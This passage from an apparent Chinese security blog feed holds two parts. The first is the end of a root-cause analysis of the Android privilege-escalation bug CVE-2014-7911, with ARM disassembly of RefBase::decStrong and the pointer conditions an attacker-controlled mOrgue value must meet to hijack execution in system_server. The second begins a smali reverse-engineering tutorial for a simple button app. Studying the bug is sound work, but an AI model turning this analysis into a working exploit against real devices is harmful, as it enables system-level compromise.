<p>这个对象销毁过程参考前边介绍的Android指针管理，decStrong中将强引用数与弱引用数同时减1，如果这是最后一个强引用的话，会调用对象的onLastStrongRef，并且判断成员变量mRefs的成员变量mFlags来决定是否在对象的强引用数为0时释放对象。</p>
<p>我们传入的mOrgue的值，即是drl-&gt;decStrong方法所在类DeathRecipientList的this指针，所以执行到refs-&gt;mBase-&gt;onLastStrongRef(id)最终导致我们的代码执行。mBase类型为RefBase* const，相当于直接跳到mOrgue地址执行了，即程序崩在了0x1337bef3，r0为函数第一个参数即this指针，所以其值也是0x1337bef3。</p>
<h3 id="反汇编定位崩溃点">反汇编定位崩溃点</h3><p>经过前边的分析已经知道了漏洞成因以及最终漏洞触发函数，但是想要利用漏洞就必须定位到具体的触发崩溃的点，需要知道最后是哪个操作造成的，以及相关寄存器哪些是可控的。</p>
<p>从android4.4.4原生系统中扣出libutil.so文件，然后反汇编android::RefBase::decStrong(void const*) const函数，汇编代码以及说明如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">================ B E G I N N I N G   O F   P R O C E D U R E ================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             _ZNK7android7RefBase9decStrongEPKv:        <span class="comment">// android::RefBase::decStrong(void const*) const</span></span><br><span class="line"><span class="number">0000</span>d172         push       &#123;r4, r5, r6, lr&#125;                                    ; XREF=_ZN7android2spINS_9BlobCache4BlobEED1Ev+<span class="number">10</span>, _ZN7android2spINS_9BlobCache4BlobEEaSERKS3_+<span class="number">22</span>, _ZN7android2spINS_14LooperCallbackEED1Ev+<span class="number">18</span>, _ZN7android2spINS_6ThreadEE5clearEv+<span class="number">18</span>, _ZN7android6Thread3runEPKcij+<span class="number">70</span>, _ZN7android6Thread11_threadLoopEPv+<span class="number">178</span>, _ZN7android6Looper16threadDestructorEPv+<span class="number">6</span>, _ZN7android6Looper12setForThreadERKNS_2spIS0_EE+<span class="number">42</span>, _ZN7android6Looper12setForThreadERKNS_2spIS0_EE+<span class="number">52</span>, _ZN7android2spINS_14LooperCallbackEEaSERKS2_+<span class="number">36</span>, _ZN7android6Looper9pollInnerEi+<span class="number">506</span>, …</span><br><span class="line"><span class="number">0000</span>d174         mov        r5, r0	<span class="comment">// r0为drl的this指针</span></span><br><span class="line"><span class="number">0000</span>d176         ldr        r4, [r0, <span class="preprocessor">#<span class="number">0x4</span>]	<span class="comment">// mRefs是drl父类RefBase虚函数下边第一个私有变量，即为drl虚表下边第一个私有变量，所以地址为this+4</span></span></span><br><span class="line"><span class="number">0000</span>d178         mov        r6, r1</span><br><span class="line"><span class="number">0000</span>d17a         mov        r0, r4	<span class="comment">// &amp;refs-&gt;mStrong为weakref_impl类的第一成员变量，并且其父类weakref_type没有虚函数，所以不存在虚表，所以其地址为r4</span></span><br><span class="line"><span class="number">0000</span>d17c         blx        android_atomic_dec@PLT <span class="comment">// 获取强引用数</span></span><br><span class="line"><span class="number">0000</span>d180         cmp        r0, <span class="preprocessor">#<span class="number">0x1</span>	<span class="comment">// 返回值与1比较</span></span></span><br><span class="line"><span class="number">0000</span>d182         bne        <span class="number">0xd19c</span>	<span class="comment">// 不等跳到0xd19c 该处为漏洞利用的约束条件</span></span><br><span class="line"></span><br><span class="line"><span class="number">0000</span>d184         ldr        r0, [r4, <span class="preprocessor">#<span class="number">0x8</span>]	<span class="comment">// weakref_impl类中mBase位于第三个成员变量，所以其地址为r4+8</span></span></span><br><span class="line"><span class="number">0000</span>d186         mov        r1, r6	<span class="comment">// refs-&gt;mBase-&gt;onLastStrongRef参数id</span></span><br><span class="line"><span class="number">0000</span>d188         ldr        r3, [r0]	<span class="comment">// 将mBase地址传给r3，即r3为RefBase类this指针</span></span><br><span class="line"><span class="number">0000</span>d18a         ldr        r2, [r3, <span class="preprocessor">#<span class="number">0xc</span>]	<span class="comment">// 父类weakref_type虚表指针vfptr+私有变量mRefs + 4(onLastStrongRef为第二个虚函数) = 0xC</span></span></span><br><span class="line"><span class="number">0000</span>d18c         blx        r2	<span class="comment">// 调用refs-&gt;mBase-&gt;onLastStrongRef</span></span><br><span class="line"><span class="number">0000</span>d18e         ldr        r0, [r4, <span class="preprocessor">#<span class="number">0xc</span>]</span></span><br><span class="line"><span class="number">0000</span>d190         lsls       r0, r0, <span class="preprocessor">#<span class="number">0x1f</span></span></span><br><span class="line"><span class="number">0000</span>d192         bmi        <span class="number">0xd19c</span></span><br><span class="line"></span><br><span class="line"><span class="number">0000</span>d194         ldr        r1, [r5]</span><br><span class="line"><span class="number">0000</span>d196         mov        r0, r5</span><br><span class="line"><span class="number">0000</span>d198         ldr        r3, [r1, <span class="preprocessor">#<span class="number">0x4</span>]</span></span><br><span class="line"><span class="number">0000</span>d19a         blx        r3</span><br><span class="line"></span><br><span class="line"><span class="number">0000</span>d19c         mov        r0, r4                                              ; argument <span class="preprocessor">#<span class="number">1</span> for method _ZN7android7RefBase12weakref_type7decWeakEPKv, XREF=_ZNK7android7RefBase9decStrongEPKv+<span class="number">16</span>, _ZNK7android7RefBase9decStrongEPKv+<span class="number">32</span></span></span><br><span class="line"><span class="number">0000</span>d19e         mov        r1, r6</span><br><span class="line"><span class="number">0000</span>d1a0         pop.w      &#123;r4, r5, r6, lr&#125;</span><br><span class="line"><span class="number">0000</span>d1a4         b.w        _ZN7android7RefBase12weakref_type7decWeakEPKv       ; android::RefBase::weakref_type::decWeak(<span class="keyword">void</span> <span class="keyword">const</span>*)</span><br><span class="line">                        ; endp</span><br></pre></td></tr></table></figure>
<p>根据汇编代码可以看出，为实现任意代码执行得满足条件：<br>&amp;refs-&gt;mStrong == 1，即<code>*(*(mOrgue+4)) == 1</code><br>所以总结下来应该是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line"><span class="keyword">if</span>(*(*(mOrgue+<span class="number">4</span>)) == <span class="number">1</span>) &#123;</span><br><span class="line">	refs = *(mOrgue+<span class="number">4</span>);</span><br><span class="line">	r2 = *(*(*(refs+<span class="number">8</span>))+<span class="number">0xC</span>);</span><br><span class="line">	blx r2 ; &lt;—— controlled;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对照反汇编代码更容易看出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> android::RefBase::decStrong(<span class="keyword">void</span> <span class="keyword">const</span>*) <span class="keyword">const</span>(<span class="keyword">void</span> * arg0) &#123;</span><br><span class="line">    r5 = arg0;</span><br><span class="line">    r4 = *(arg0 + <span class="number">0x4</span>);</span><br><span class="line">    r6 = r1;</span><br><span class="line">    <span class="keyword">if</span> (android_atomic_dec() == <span class="number">0x1</span>) &#123;</span><br><span class="line">            r0 = *(r4 + <span class="number">0x8</span>);</span><br><span class="line">            r3 = *r0;</span><br><span class="line">            r2 = *(r3 + <span class="number">0xc</span>);</span><br><span class="line">            (r2)(r0, r6, r2, r3);</span><br><span class="line">            <span class="keyword">if</span> (PARITY(*(r4 + <span class="number">0xc</span>) &lt;&lt; <span class="number">0x1f</span>)) &#123;</span><br><span class="line">                    r1 = *r5;</span><br><span class="line">                    (*(r1 + <span class="number">0x4</span>))(r5, r1);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Pop();</span><br><span class="line">    Pop();</span><br><span class="line">    Pop();</span><br><span class="line">    Pop();</span><br><span class="line">    r0 = android::RefBase::weakref_type::decWeak(r4);</span><br><span class="line">    <span class="keyword">return</span> r0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后执行的汇编代码地址为<br><code>r2 = *(*(*(refs+8))+0xC) = *(*(*(*(mOrgue+4)+8))+0xC)</code></p>
<h2 id="思考">思考</h2><p>通过分析，其实这个漏洞触发需要的条件就两个：</p>
<ol>
<li>向system_server传递对象，并且system_server会将该对象反序列化。</li>
<li>传递数据前将可序列化的对象修改为不可序列化。</li>
</ol>
<p>第一个问题，是否必须使用Android.os.UserManager.setApplicationRestrictions方法向system_server传递对象？<br>并不是，其实我们需要的是找到一个途径将序列化后的对象传递进system_server进程，并且system_server会将该对象反序列化，只要满足这样的条件均可。这样的系统服务还是很多的，例如frameworks\base\services\java\com\android\server目录下的系统服务，找到相对应的应用层通信调用的地方就可以了。</p>
<p>第二个问题，为什么要将AAdroid.os.BinderProxy修改为Android.os.BinderProxy？<br>漏洞的整个触发过程仅仅是向system_server进程传递了一个恶意对象实例，此时没有任何该对象的方法或者数据被使用，然而由于Java GC机制，当该对象被清理时，GC将调用他的finalize方法。由于finalize方法是不可控的，可控仅仅是该恶意对象，所以漏洞仍然无法利用。回头再看Android.os.BinderProxy，它在其finalize方法中将变量mObject和mOrgue强制转换为函数指针并调用。但是其中mObject和mOrgue的值是可控的，这样就相当于可以向system_server传递一个任意值的函数指针this，并在该对象实例被GC时有机会获得控制权。</p>
<h2 id="漏洞利用">漏洞利用</h2><p><a href="http://blog.idhyt.com/2015/08/01/exploit-cve-2014-7911-exp/">CVE-2014-7911安卓本地提权漏洞利用</a></p>
<h2 id="参考">参考</h2><p><a href="http://ele7enxxh.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html" target="_blank" rel="external">CVE-2014-7911安卓本地提权漏洞详细分析</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="简介">简介</h2><p>CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令，影响版本包括4.4以前所有的版本。该漏洞是一个非常有学习价值的漏洞，其涉及的知识非常广泛，包括]]>
    </summary>
    
      <category term="cve" scheme="http://blog.idhyt.com/tags/cve/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安卓逆向学习笔记-ClickButton]]></title>
    <link href="http://blog.idhyt.com/2015/05/11/android-reverse-clickbutton/"/>
    <id>http://blog.idhyt.com/2015/05/11/android-reverse-clickbutton/</id>
    <published>2015-05-11T09:45:11.000Z</published>
    <updated>2015-12-28T06:49:02.000Z</updated>
    <content type="html"><![CDATA[<p>安卓逆向笔记,熟悉smali语法和函数调用<br>一个按钮程序,实现功能：点击 - 弹窗 - 退出</p>
<h2 id="源码">源码</h2><p>主功能代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_click_button);</span><br><span class="line">    Button button = (Button)findViewById(R.id.click_me);</span><br><span class="line">    button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="annotation">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            AlertDialog.Builder alert = <span class="keyword">new</span> AlertDialog.Builder(ClickButton.<span class="keyword">this</span>);</span><br><span class="line">            alert.setTitle(<span class="string">"hello world"</span>);</span><br><span class="line">            alert.setPositiveButton(<span class="string">"exit"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">                <span class="annotation">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">                    dialog.dismiss();</span><br><span class="line">                    ClickButton.<span class="keyword">this</span>.finish();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            alert.show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>点击 - 弹窗 - 退出, 功能如下图所示：</p>
<p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-reverse-clickbutton_1.png" alt=""></p>
<p>xml布局</p>
<pre><code>&lt;RelativeLayout xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span>
    xmlns:tools=<span class="string">"http://schemas.android.com/tools"</span> android:layout_width=<span class="string">"match_parent"</span>
    android:layout_height=<span class="string">"match_parent"</span> android:paddingLeft=<span class="string">"<span class="variable">@dimen</span>/activity_horizontal_margin"</span>
    android:paddingRight=<span class="string">"<span class="variable">@dimen</span>/activity_horizontal_margin"</span>
    android:paddingTop=<span class="string">"<span class="variable">@dimen</span>/activity_vertical_margin"</span>
    android:paddingBottom=<span class="string">"<span class="variable">@dimen</span>/activity_vertical_margin"</span> tools:context=<span class="string">".HelloWorld"</span>&gt;
    &lt;TextView
        android:text=<span class="string">"<span class="variable">@string</span>/hello_world"</span>
        android:layout_width=<span class="string">"wrap_content"</span>
        android:layout_height=<span class="string">"wrap_content"</span>
        android:id=<span class="string">"<span class="variable">@+</span>id/textView"</span> /&gt;
    &lt;Button
        android:id = <span class="string">"<span class="variable">@+</span>id/click_me"</span>
        android:text=<span class="string">"<span class="variable">@string</span>/click_me"</span>
        android:layout_width=<span class="string">"wrap_content"</span>
        android:layout_height=<span class="string">"wrap_content"</span>
        android:layout_below=<span class="string">"<span class="variable">@+</span>id/textView"</span> /&gt;
&lt;<span class="regexp">/RelativeLayout&gt;</span>
</code></pre><h2 id="反编译">反编译</h2><p>apktool反编译成smali文件或者直接用apkIDE(apk改之理)打开，会自动进行反编译，如下图所示<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-reverse-clickbutton_2.png" alt=""></p>
<p>主要看主类ClickButton.smali，还有ClickButton$1.smali, ClickButton$1$1.smali两个文件。<br>这两个文件是匿名内部类的Smali代码，由于没有名字，所以编译后只能用$XXX来区分。</p>
<h2 id="逆向分析">逆向分析</h2><h3 id="主类文件头部分">主类文件头部分</h3><p>1-3行定义的是基本信息，参照着前边的源码，很容易对应起来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.class <span class="keyword">public</span> Lcom/reverse/idhyt/androidreverse/ClickButton;</span><br><span class="line">.<span class="keyword">super</span> Landroid/app/Activity;</span><br><span class="line">.source <span class="string">"ClickButton.java"</span></span><br></pre></td></tr></table></figure>
<p>这是一个由ClickButton.java编译得到的smali文件（第3行），<br>它是com.reverse.idhyt.androidreverse这个package下的一个类（第1行），<br>继承自android.app.Activity，即父类为android.app.Activity（第2行）</p>
<h3 id="定位入口函数">定位入口函数</h3><p>找到onCreate函数，定位启动代码如下</p>
<pre><code><span class="comment"># virtual methods</span>
<span class="keyword">.method</span><span class="keyword"> protected</span><span class="function"> onCreate(</span><span class="class">Landroid/os/Bundle;</span><span class="function">)</span>V
<span class="keyword">    .locals</span> 2
<span class="keyword">    .param</span> <span class="variable">p1</span>, <span class="string">"savedInstanceState"</span>    <span class="comment"># Landroid/os/Bundle;</span>
<span class="keyword">    .prologue</span>
<span class="keyword">    .line</span> 18
   <span class="instruction"> invoke-super </span>{<span class="variable">p0</span>, <span class="variable">p1</span>}, <span class="class">Landroid/app/Activity;</span><span class="function">-&gt;onCreate(</span><span class="class">Landroid/os/Bundle;</span><span class="function">)</span>V
<span class="keyword">    .line</span> 19
   <span class="instruction"> const </span><span class="variable">v1</span>, 0x7f040017
   <span class="instruction"> invoke-virtual </span>{<span class="variable">p0</span>, <span class="variable">v1</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">-&gt;setContentView(</span>I<span class="function">)</span>V
<span class="keyword">    .line</span> 20
   <span class="instruction"> const </span><span class="variable">v1</span>, 0x7f090040
   <span class="instruction"> invoke-virtual </span>{<span class="variable">p0</span>, <span class="variable">v1</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">-&gt;findViewById(</span>I<span class="function">)</span><span class="class">Landroid/view/View;</span>
   <span class="instruction"> move-result-object </span><span class="variable">v0</span>
   <span class="instruction"> check-cast </span><span class="variable">v0</span>, <span class="class">Landroid/widget/Button;</span>
<span class="keyword">    .line</span> 21
<span class="keyword">    .local</span> <span class="variable">v0</span>, <span class="string">"button"</span>:<span class="class">Landroid/widget/Button;</span>
   <span class="instruction"> new-instance </span><span class="variable">v1</span>, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span>
   <span class="instruction"> invoke-direct </span>{<span class="variable">v1</span>, <span class="variable">p0</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span><span class="function">-&gt;&lt;init&gt;(</span><span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">)</span>V
   <span class="instruction"> invoke-virtual </span>{<span class="variable">v0</span>, <span class="variable">v1</span>}, <span class="class">Landroid/widget/Button;</span><span class="function">-&gt;setOnClickListener(</span><span class="class">Landroid/view/View$OnClickListener;</span><span class="function">)</span>V
<span class="keyword">    .line</span> 36
   <span class="instruction"> return-void
</span><span class="keyword">.end method</span>
</code></pre><h3 id="翻译smali代码">翻译smali代码</h3><p>第1行：</p>
<pre><code><span class="preprocessor"># virtual methods 注释后是虚方法</span>
</code></pre><p>第2行：</p>
<pre><code>.<span class="keyword">method</span> protected onCreate(<span class="type">Landroid</span>/os/<span class="type">Bundle</span>;)V
</code></pre><p>这里先简单了解一下alvik字节码，详细参考：<a href="http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html" target="_blank" rel="external">dalvik_opcodes</a></p>
<p>alvik字节码有类型两种，原始类型和引用类型。对象和数组是引用类型，其它都是原始类型。</p>
<pre><code>V    <span class="keyword">void</span>，只能用于返回值类型
Z    <span class="keyword">boolean</span>
B    <span class="keyword">byte</span>
S    <span class="keyword">short</span>
C    <span class="keyword">char</span>
I    <span class="keyword">int</span>
J    <span class="keyword">long</span>（<span class="number">64</span>位）
F    <span class="keyword">float</span>
D    <span class="keyword">double</span>(<span class="number">64</span>位)
</code></pre><p>对象以Lpackage/name/ObjectName;的表示形式。前面的L表示这是一个对象类型，package/name/是该对象所在的包，ObjectName是对象的名字，“;”表示对象名称的结束。相当于java中的package.name.ObjectName。</p>
<p>了解了这些再看第2行代码：<br>onCreate函数参数为一个对象类型，对象名为Bundle， 该对象所在的包为android/os，对应java中android.os.Bundle</p>
<p>第3行：</p>
<pre><code><span class="class">.locals</span> <span class="number">2</span>
</code></pre><p>标明了你在这个函数中最少要用到的本地寄存器的个数为2，即指定了使用的局部变量的个数</p>
<p>第4行：</p>
<pre><code>.<span class="built_in">param</span> p1, <span class="string">"savedInstanceState"</span>    <span class="comment"># Landroid/os/Bundle;</span>
</code></pre><p>“.parameter”指定了方法的参数，每个”.parameter”指令表明使用一个参数，比如方法中有使用到3个参数，那么就会出现3条“.parameter”指令。</p>
<p>第6-7行：</p>
<pre><code>“<span class="class">.prologue</span>” <span class="class">.line</span>
</code></pre><p>“.prologue”指定了代码的开始处，混淆过的代码可能去掉了该指令。<br>“.line”指定了该处指令在源代码中的行号，同样的，混淆过的代码可能去除了行号信息。</p>
<p>第8行：</p>
<pre><code>invoke-<span class="keyword">super</span> {p0, p1}, Landroid<span class="regexp">/app/</span>Activity;-&gt;onCreate(Landroid<span class="regexp">/os/</span>Bundle;)V
</code></pre><p>这里先了解一下寄存器和函数调用方法</p>
<h4 id="寄存器">寄存器</h4><p>在smali里的所有操作都必须经过寄存器来进行</p>
<p>本地寄存器用v开头数字结尾的符号来表示，如v0、v1、v2、…<br>参数寄存器则使用p开头数字结尾的符号来表示，如p0、p1、p2、…<br>特别注意的是，p0不一定是函数中的第一个参数<br>在非static函数中，p0代指“this”，p1表示函数的第一个参数，p2代表函数中的第二个参数…<br>而在static函数中p0才对应第一个参数（因为Java的static方法中没有this方法）<br>本地寄存器没有限制，理论上是可以任意使用的。</p>
<p>再看代码，这里寄存器p1 = “savedInstanceState”，后边将用作传参</p>
<h4 id="函数">函数</h4><p>smali中的函数和成员变量一样也分为两种类型，但是不同成员变量中的static和instance之分，而是direct和virtual之分。<br>那么direct method和virtual method有什么区别呢？直白地讲，direct method就是private函数，其余的public和protected函数都属于virtual method。</p>
<p>表示形式</p>
<pre><code>Lpackage/name/ObjectName;-&gt;MethodName(III)Z
Lpackage/name/ObjectName;表示类型，MethodName是方法名。III为参数（在此是<span class="number">3</span>个整型参数），Z是返回类型（<span class="keyword">bool</span>型）。
方法的参数是一个接一个的，中间没有隔开。
</code></pre><p>调用方式</p>
<p>调用函数时，有invoke-direct，invoke-virtual，另外还有invoke-static、invoke-super以及invoke-interface等几种不同的指令。<br>当然其实还有invoke-XXX/range 指令的，这是参数多于4个的时候调用的指令，比较少见，了解下即可。<br>invoke-static：顾名思义就是调用static函数的，因为是static函数，所以比起其他调用少一个参数this指针。<br>invoke-super：调用父类方法用的指令，在onCreate、onDestroy等方法都能看到。<br>invoke-direct：调用private函数的。<br>invoke-virtual：用于调用protected或public函数，同样注意修改smali时不要错用invoke-direct或invoke-static<br>invoke-xxxxx/range：当方法的参数多于5个时（含5个），不能直接使用以上的指令，而是在后面加上“/range”</p>
<p>再看代码，调用父类android.app.Activity的onCreate方法，参数为p1 = “savedInstanceState” 类型为android.os.Bundle，返回类型为void型，其中p0为this指针</p>
<h2 id="完整注释">完整注释</h2><p>主类代码详细注释如下所示：</p>
<pre><code><span class="comment"># virtual methods</span>
<span class="keyword">.method</span><span class="keyword"> protected</span><span class="function"> onCreate(</span><span class="class">Landroid/os/Bundle;</span><span class="function">)</span>V
<span class="keyword">    .locals</span> 2
    <span class="comment"># 标明了你在这个函数中最少要用到的本地寄存器的个数</span>
<span class="keyword">    .param</span> <span class="variable">p1</span>, <span class="string">"savedInstanceState"</span>    <span class="comment"># Landroid/os/Bundle;</span>
    <span class="comment"># 指定了方法的参数</span>
<span class="keyword">    .prologue</span>
    <span class="comment"># 代码的开始处</span>
<span class="keyword">    .line</span> 18
    <span class="comment"># 该处指令在源代码中的行号</span>
   <span class="instruction"> invoke-super </span>{<span class="variable">p0</span>, <span class="variable">p1</span>}, <span class="class">Landroid/app/Activity;</span><span class="function">-&gt;onCreate(</span><span class="class">Landroid/os/Bundle;</span><span class="function">)</span>V
    <span class="comment"># 调用父类android.app.Activity的onCreate方法，参数为p1 = "savedInstanceState" 类型为android.os.Bundle, 返回类型为void型。其中p0为this引用</span>
<span class="keyword">    .line</span> 19
   <span class="instruction"> const </span><span class="variable">v1</span>, 0x7f040017
    <span class="comment"># 使用了v1本地寄存器，并把值0x7f040017存到v1中</span>
   <span class="instruction"> invoke-virtual </span>{<span class="variable">p0</span>, <span class="variable">v1</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">-&gt;setContentView(</span>I<span class="function">)</span>V
    <span class="comment"># 调用了public com.reverse.idhyt.androidreverse.ClickButton的setContentView方法， 参数为v1 = 0x7f040017(参考源码可知该值表示布局文件), 返回类型为void型</span>
<span class="keyword">    .line</span> 20
   <span class="instruction"> const </span><span class="variable">v1</span>, 0x7f090040
    <span class="comment"># 使用了v1本地寄存器，并把值0x7f090040存到v1中</span>
   <span class="instruction"> invoke-virtual </span>{<span class="variable">p0</span>, <span class="variable">v1</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">-&gt;findViewById(</span>I<span class="function">)</span><span class="class">Landroid/view/View;</span>
    <span class="comment"># 调用了public com.reverse.idhyt.androidreverse.ClickButton的findViewById方法， 参数为v1 = 0x7f090040(参考源码可知该值表示一个button按钮), 返回类型为void型</span>
   <span class="instruction"> move-result-object </span><span class="variable">v0</span>
    <span class="comment"># 将findViewById的返回对象存入寄存器v0中，用法参考-&gt;函数返回结果</span>
   <span class="instruction"> check-cast </span><span class="variable">v0</span>, <span class="class">Landroid/widget/Button;</span>
    <span class="comment"># 检测v0的对象引用是否可实例化</span>
    <span class="comment"># Dalvik opcodes </span>
    <span class="comment"># Opcode name: check-cast vx, type_id</span>
    <span class="comment"># Explanation: Checks whether the object reference in vx can be cast to an instance of a class referenced by type_id. Throws ClassCastException if the cast is not possible, continues execution otherwise.</span>
<span class="keyword">    .line</span> 21
<span class="keyword">    .local</span> <span class="variable">v0</span>, <span class="string">"button"</span>:<span class="class">Landroid/widget/Button;</span>
    <span class="comment"># v0 = "button"(源码中定义的变量名) 类型 android/widget/Button</span>
   <span class="instruction"> new-instance </span><span class="variable">v1</span>, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span>
    <span class="comment"># 创建类实例 vi = com.reverse.idhyt.androidreverse.ClickButton$1 即类ClickButton$1实例化</span>
   <span class="instruction"> invoke-direct </span>{<span class="variable">v1</span>, <span class="variable">p0</span>}, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span><span class="function">-&gt;&lt;init&gt;(</span><span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span><span class="function">)</span>V
    <span class="comment"># 调用类ClickButton$1的private函数init, 参数为p0 类型为com.reverse.idhyt.androidreverse.ClickButton, 其中v1为类对象本身，即this</span>
   <span class="instruction"> invoke-virtual </span>{<span class="variable">v0</span>, <span class="variable">v1</span>}, <span class="class">Landroid/widget/Button;</span><span class="function">-&gt;setOnClickListener(</span><span class="class">Landroid/view/View$OnClickListener;</span><span class="function">)</span>V
    <span class="comment"># 调用类android.widget.Button中定义的一个pravite函数setOnClickListener</span>
    <span class="comment"># 参数v0为android.widget.Button, v1为传递给setOnClickListener方法的Landroid/view/View$OnClickListener参数</span>
    <span class="comment"># 即为button按钮添加了一个点击监听事件，其实现代码在v1 = ClickButton$1中</span>
</code></pre><p>button点击事件代码</p>
<pre><code><span class="comment"># virtual methods</span>
<span class="keyword">.method</span><span class="keyword"> public</span><span class="function"> onClick(</span><span class="class">Landroid/view/View;</span><span class="function">)</span>V
<span class="keyword">    .locals</span> 3
<span class="keyword">    .param</span> <span class="variable">p1</span>, <span class="string">"v"</span>    <span class="comment"># Landroid/view/View;</span>
<span class="keyword">    .prologue</span>
<span class="keyword">    .line</span> 24
   <span class="instruction"> new-instance </span><span class="variable">v0</span>, <span class="class">Landroid/app/AlertDialog$Builder;</span>
    <span class="comment"># v0 = this 对照源码：new AlertDialog.Builder()</span>
   <span class="instruction"> iget-object </span><span class="variable">v1</span>, <span class="variable">p0</span>, <span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton$1;</span>-&gt;this$0:<span class="class">Lcom/reverse/idhyt/androidreverse/ClickButton;</span>
    <span class="comment"># 调用对象 ClickButton.this 对照源码 new AlertDialog.Builder(ClickButton.this)</span>
   <span class="instruction"> invoke-direct </span>{<span class="variable">v0</span>, <span class="variable">v1</span>}, <span class="class">Landroid/app/AlertDialog$Builder;</span><span class="function">-&gt;&lt;init&gt;(</span><span class="class">Landroid/content/Context;</span><span class="function">)</span>V
    <span class="comment"># 初始化Context</span>
<span class="keyword">    .line</span> 25
<span class="keyword">    .local</span> <span class="variable">v0</span>, <span class="string">"alert"</span>:<span class="class">Landroid/app/AlertDialog$Builder;</span>
    <span class="comment"># v0 = "alert" 类型：android/app/AlertDialog$Builder</span>
   <span class="instruction"> const-string </span><span class="variable">v1</span>, <span class="string">"hello world"</span>
    <span class="comment"># v1 = "hello world"</span>
   <span class="instruction"> invoke-virtual </span>{<span class="variable">v0</span>, <span class="variable">v1</span>}, <span class="class">Landroid/app/AlertDialog$Builder;</span><span class="function">-&gt;setTitle(</span><span class="class">Ljava/lang/CharSequence;</span><span class="function">)</span><span class="class">Landroid/app/AlertDialog$Builder;</span>
    <span class="comment"># 调用v0的setTitle方法，返回类型为android/app/AlertDialog$Builder，对应源码alert.setTitle("hello world")</span>
<span class="keyword">    .line</span> 26
